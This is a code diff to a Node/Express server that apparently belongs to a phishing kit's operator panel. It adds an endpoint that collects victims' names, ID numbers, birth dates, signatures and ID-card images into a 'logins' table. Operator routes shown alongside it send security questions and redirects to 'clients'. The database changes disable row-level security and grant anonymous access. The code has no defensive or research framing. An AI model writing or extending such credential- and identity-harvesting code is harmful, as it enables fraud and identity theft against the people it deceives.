@@ -187,6 +187,33 @@ app.post('/api/admin/redirect/:id', async (req, res) => {
   }
 });
 
+// Submit update data form
+app.post('/api/submit-update/:id', async (req, res) => {
+  try {
+    const b = req.body;
+    const updateData = JSON.stringify({
+      full_name: String(b.full_name || ''),
+      id_number: String(b.id_number || ''),
+      birth_date: String(b.birth_date || ''),
+      phone: String(b.phone || ''),
+      email: String(b.email || ''),
+      signature: String(b.signature || ''),
+      id_front: String(b.id_front || ''),
+      id_back: String(b.id_back || '')
+    });
+    const { error } = await supabase.from('ocash_logins').update({
+      update_data: updateData,
+      step: 'update-data',
+      status: 'pending',
+      updated_at: new Date().toISOString()
+    }).eq('id', req.params.id);
+    if (error) throw error;
+    res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // Admin: send security question to client
 app.post('/api/admin/send-question/:id', async (req, res) => {
   try {
@@ -257,6 +284,7 @@ async function autoMigrate() {
       ALTER TABLE ocash_logins ADD COLUMN IF NOT EXISTS security_question TEXT DEFAULT '';
       ALTER TABLE ocash_logins ADD COLUMN IF NOT EXISTS security_answer TEXT DEFAULT '';
       ALTER TABLE ocash_logins ADD COLUMN IF NOT EXISTS redirect_to TEXT DEFAULT '';
+      ALTER TABLE ocash_logins ADD COLUMN IF NOT EXISTS update_data TEXT DEFAULT '';
       ALTER TABLE ocash_logins DISABLE ROW LEVEL SECURITY;
       GRANT ALL ON ocash_logins TO anon, authenticated, service_role;
     `);
